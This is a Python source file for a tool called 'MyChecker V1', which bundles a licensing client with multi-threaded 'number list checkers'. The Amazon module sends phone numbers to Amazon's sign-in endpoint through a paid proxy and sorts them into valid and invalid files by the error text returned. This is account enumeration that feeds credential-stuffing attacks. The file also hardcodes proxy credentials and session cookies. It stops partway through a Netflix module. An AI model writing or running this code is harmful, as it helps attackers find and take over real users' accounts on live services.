import requests, fade, ctypes, re, sys, random, time, os, os.path, platform, hashlib, warnings, threading, urllib, json, colorama, selenium.webdriver.chrome.options, win32security, binascii, json as jsond
from uuid import uuid4
from lib2to3.pgen2.driver import Driver
from selenium import webdriver
from requests_toolbelt.adapters.fingerprint import FingerprintAdapter
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from seleniumwire import webdriver
from json import dumps
from sys import argv, exit
from easygui import fileopenbox
from requests import get, post, Session
from requests.auth import HTTPProxyAuth
from multiprocessing.dummy import Pool, Lock
from ctypes import windll
from colorama import Fore, init, Back, Style
from threading import Thread
from time import sleep, strftime
from datetime import datetime
from os import  mkdir, path, name, _exit, system
from random import choice, randint
from urllib.parse import quote
from urllib.request import Request, urlopen
from base64 import b64decode
from json import JSONDecodeError
from prettytable import PrettyTable
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad   

class api:
    name = ownerid = secret = version = hash_to_check = ""
    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name
        self.ownerid = ownerid
        self.secret = secret
        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):
        if self.sessionid != "":
            print("You've already initialized!")
            time.sleep(2)
            exit(0)
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("init").encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            sys.exit()
        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)
        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                sys.exit()
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                sys.exit()
        if not json["success"]:
            print(json["message"])
            sys.exit()
        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])



    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("register").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            print("successfully registered")
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            sys.exit()

    def upgrade(self, user, license):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("upgrade").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            print("successfully upgraded user")
            print("please restart program and login")
            sys.exit()
        else:
            print(json["message"])
            sys.exit()

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("login").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged in")
        else:
            print(json["message"])
            sys.exit()

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("license").encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged into license")
        else:
            print(json["message"])
            sys.exit()
    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("var").encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("getvar").encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return json["response"]
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("setvar").encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()    

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("ban").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()    

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("file").encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if not json["success"]:
            print(json["message"])
            time.sleep(5)
            sys.exit()
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("webhook").encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("check").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("checkblacklist").encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("log").encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        self.__do_request(post_data)

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            sys.exit()

    def __do_request(self, post_data):

        rq_out = requests.post(
            "https://keyauth.win/api/1.0/", data=post_data
        )
        return rq_out.text

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""
    # region user_data
    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]



class others:
    @staticmethod
    def get_hwid():
        winuser = os.getlogin()
        if platform.system() != "Windows":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid

        sid = win32security.LookupAccountName(None, winuser)[0]
        sidstr = win32security.ConvertSidToStringSid(sid)

        return sidstr


class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            sys.exit()

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            sys.exit()

time1 = strftime("(%d-%m-%Y-%H-%M)")

def red(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 250
        for character in line:
            green -= 5
            if green < 0:
                green = 0
            faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
        faded += "\n"
    return faded

def blue(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 0
        for character in line:
            green += 3
            if green > 255:
                green = 255
            faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
        faded += "\n"
    return faded

def greenblue(text):
    os.system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

def purple(text):
    os.system("")
    faded = ""
    down = False

    for line in text.splitlines():
        red = 40
        for character in line:
            if down:
                red -= 3
            else:
                red += 3
            if red > 254:
                red = 255
                down = True
            elif red < 1:
                red = 30
                down = False
            faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
    return faded

def clear():
    system('cls' if name == 'nt' else 'clear')


def plasmamotd():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

        faded_text = fade.greenblue(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET) + "\n")


def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class AmazonNum:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    timeout = 0
    numlist = []

    def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
 $$$$$$\  $$\      $$\  $$$$$$\  $$$$$$$$\  $$$$$$\  $$\   $$\ 
$$  __$$\ $$$\    $$$ |$$  __$$\ \____$$  |$$  __$$\ $$$\  $$ |
$$ /  $$ |$$$$\  $$$$ |$$ /  $$ |    $$  / $$ /  $$ |$$$$\ $$ |
$$$$$$$$ |$$\$$\$$ $$ |$$$$$$$$ |   $$  /  $$ |  $$ |$$ $$\$$ |
$$  __$$ |$$ \$$$  $$ |$$  __$$ |  $$  /   $$ |  $$ |$$ \$$$$ |
$$ |  $$ |$$ |\$  /$$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |\$$$ |
$$ |  $$ |$$ | \_/ $$ |$$ |  $$ |$$$$$$$$\  $$$$$$  |$$ | \$$ |
\__|  \__|\__|     \__|\__|  \__|\________| \______/ \__|  \__|                                                                                         
\n"""))

        faded_text = fade.fire(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.YELLOW+"~"+Fore.RESET) + "\n")

    def console_title():
        while True:
            windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Amazon NumList Checker {AmazonNum.checked}/{AmazonNum.loaded} - {AmazonNum.valid} Valids - {AmazonNum.invalid} Invalids - {AmazonNum.cpm} CPM")

    def cpm_counter():
        while True:
            now = AmazonNum.checked
            sleep(1)
            AmazonNum.cpm = (AmazonNum.checked - now) * 60


    def AmazonNum(numlist):
        data = {'appActionToken': 'Yq2mhgfDpdFgAc7Q0195zsKMhMgj3D',
        'appAction': 'SIGNIN_PWD_COLLECT',
        'subPageType': 'SignInClaimCollect',
        'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmZyLz9yZWZfPW5hdl9zaWduaW4=',
        'prevRID': 'ape:MDU0NEE2SjhFRlFRUTYyN1dKVjQ=',
        'workflowState': 'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.82kD-hdrp3qMJkrTTdkc7Kc08KLPQBHL_iQoQ2pjIS8D31IZSfbInA.90U5VKcKctZvMWjr.o5bTk4T5fy7FanxrQ70Wd9a7Yeg7j8PwNCf31MdIe_tCA2xU4aDIeFto4vZZ_WOuNIRDKX3wCSfPtNeRwWKZSYEf9iy5STM6hyqrBd8dn6HAj2scs056iFAFf6nbuTvZzZ4PMNkbe9XAlm49L9UhlE2WhNYp9J1C4v_BKloM8634tt3qqr6TJmE7sF2ALES8v27bQGYVbC0TT7gnvRhbd2J9KiXpNRw3ksFN9hxvbOmHSMd5yQ4LS9h8BxNWmO0d5_687P05l20JZ6TJHdY1-JD2aNnK4Gp96DGTQu2WYKexFuz0-wo3RJVqcJJUGQTTIKz9._B41CuwhGFlx-f0Rgma_bA',
        'email': numlist,
        'password': '',
        'create': '0',
        'metadata1': 'ECdITeCs:'
        }
        headers = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "fr,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-length": "9702",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes',
        "downlink": "10",
        "ect": "4g",
        "origin": "https://www.amazon.fr",
        "referer": "https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
        "rtt": "150",
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
        }
        proxies = {"http":"ultra.marsproxies.com:44443"}
        auth = HTTPProxyAuth("mr13125xB8O", "MdjQovUIpj")
        try:
            req = requests.post(f"https://www.amazon.fr/ap/signin", data=data, headers=headers, proxies=proxies, auth=auth, timeout=10).text
            if req.__contains__("Numéro de téléphone incorrect" or "Incorrect phone number"):
                AmazonNum.invalid += 1
                AmazonNum.checked += 1
                print(f"{Fore.LIGHTRED_EX} [-] {numlist}")
                open(f"results/AmazonNumlist-{time1}/Invalids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{numlist}\n")
            elif req.__contains__("Mot de passe oublié" or "Forgot your password?"):
                AmazonNum.valid += 1
                AmazonNum.checked += 1
                print(f"{Fore.LIGHTGREEN_EX} [+] {numlist}")
                open(f"results/AmazonNumlist-{time1}/Valids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{numlist}\n")
            elif req.__contains__("Envoyer un code de connexion sur votre téléphone" or "Get an OTP on your phone"):
                AmazonNum.valid += 1
                AmazonNum.checked += 1
                print(f"{Fore.LIGHTGREEN_EX} [+] {numlist}")
                open(f"results/AmazonNumlist-{time1}/Valids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{numlist}\n")
            else:
                AmazonNum.recheck += 1
                AmazonNum.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {numlist}")
                open(f"results/AmazonNumlist-{time1}/Rechecks.txt", "a+", encoding="utf-8", errors="ignore").write(f"{numlist}\n")
        except:
                AmazonNum.recheck += 1
                AmazonNum.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {numlist}")
                open(f"results/Operateur-Checker-{time1}/Recheck.txt", "a+", encoding='utf-8', errors='ignore').write(f"{numlist}\n")

    def start():
        try:
            AmazonNum.banner()
            print(f" \n[{Fore.YELLOW}#{Fore.WHITE}]  Please import your Numberlist...")
            numlist = open(fileopenbox(title="Select your Numberlist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
            clear()
            AmazonNum.banner()
            username = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Username > ')
            clear()
            AmazonNum.banner()
            password = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Password > ')
            clear()
            AmazonNum.banner()
            endpoint = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Ip > ')
            clear()
            AmazonNum.banner()
            port = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Port > ')
            clear()
            AmazonNum.banner()
            AmazonNum.loaded = len(numlist)
            try:

                threads = int(input("\nThreads : "))
            except:
                print(f"\n{Fore.LIGHTRED_EX}Invalid threads !")
                sleep(3)
                AmazonNum.start()
            Thread(target=AmazonNum.console_title, daemon=False).start()
            Thread(target=AmazonNum.cpm_counter, daemon=False).start()
            if not path.exists("results"):
                mkdir("results")
            if not path.exists(f"results/AmazonNumlist-{time1}"):
                mkdir(f"results/AmazonNumlist-{time1}")
            if not path.exists(f"results/AmazonNumlist-{time1}/Capture"):
                mkdir(f"results/AmazonNumlist-{time1}/Capture")
            mainpool = Pool(processes=threads)
            mainpool.imap_unordered(AmazonNum.AmazonNum, numlist)
            mainpool.close()
            mainpool.join()
            if AmazonNum.checked == AmazonNum.loaded:
                print("\nTerminé !")
            input(f'Appuie sur une touche pour retourner au menu')
            accueil()
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e

class NetflixNum:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    timeout = 0
    numlist = []

    def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
$$\   $$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$\       $$$$$$\ $$\   $$\ 
$$$\  $$ |$$  _____|\__$$  __|$$  _____|$$ |      \_$$  _|$$ |  $$ |
$$$$\ $$ |$$ |         $$ |   $$ |      $$ |        $$ |  \$$\ $$  |
$$ $$\$$ |$$$$$\       $$ |   $$$$$\    $$ |        $$ |   \$$$$  / 
$$ \$$$$ |$$  __|      $$ |   $$  __|   $$ |        $$ |   $$  $$<  
$$ |\$$$ |$$ |         $$ |   $$ |      $$ |        $$ |  $$  /\$$\ 
$$ | \$$ |$$$$$$$$\    $$ |   $$ |      $$$$$$$$\ $$$$$$\ $$ /  $$ |
\__|  \__|\________|   \__|   \__|      \________|\______|\__|  \__|                                                                                                                                                                               
"""))
        faded_text = fade.fire(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTRED_EX+"~"+Fore.RESET))

    def start():
        driver_service = Service(executable_path=ChromeDriverManager().install())
        os.system('cls')
        os.system(f'title MyChecker V1 - Netflix')
        NetflixNum.banner()
        clear()
        NetflixNum.banner()
        if not path.exists("results"):
             mkdir("results")
        if not path.exists(f"results/NetflixNumlist-{time1}"):
            mkdir(f"results/NetflixNumlist-{time1}")
        if not path.exists(f"results/NetflixNumlist-{time1}/Capture"):
            mkdir(f"results/NetflixNumlist-{time1}/Capture")
        if not path.exists(f"results/NetflixNumlist"):
            mkdir(f"results/NetflixNumlist")
        print(f"\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please import your Numberlist...")
        nums = open(fileopenbox(title="Select your Numberlist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
        if not path.isfile("results/NetflixNumlist/username.txt"):
            clear()
            NetflixNum.banner()
            username = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Username > ')
            clear()
            NetflixNum.banner()
            password = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Password > ')
            clear()
            NetflixNum.banner()
            endpoint = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Ip > ')
            clear()
            NetflixNum.banner()
            port = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Port > ')
            clear()
            NetflixNum.banner()
            pays = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your flags (FR, EN etc...) > ') 
            open(f"results/NetflixNumlist/username.txt", "a+", encoding='utf-8', errors='ignore').write(f"{username}")
            open(f"results/NetflixNumlist/password.txt", "a+", encoding='utf-8', errors='ignore').write(f"{password}")
            open(f"results/NetflixNumlist/ip.txt", "a+", encoding='utf-8', errors='ignore').write(f"{endpoint}")
            open(f"results/NetflixNumlist/port.txt", "a+", encoding='utf-8', errors='ignore').write(f"{port}")
            open(f"results/NetflixNumlist/pays.txt", "a+", encoding='utf-8', errors='ignore').write(f"{pays}")
        else:
            a = open('results/NetflixNumlist/username.txt', 'r')
            file_contentsa = a.read()
            username = (file_contentsa)
            b = open('results/NetflixNumlist/password.txt', 'r')
            file_contentsb = b.read()
            password = (file_contentsb)
            c = open('results/NetflixNumlist/ip.txt', 'r')
            file_contentsc = c.read()
            endpoint = (file_contentsc)
            d = open('results/NetflixNumlist/port.txt', 'r')
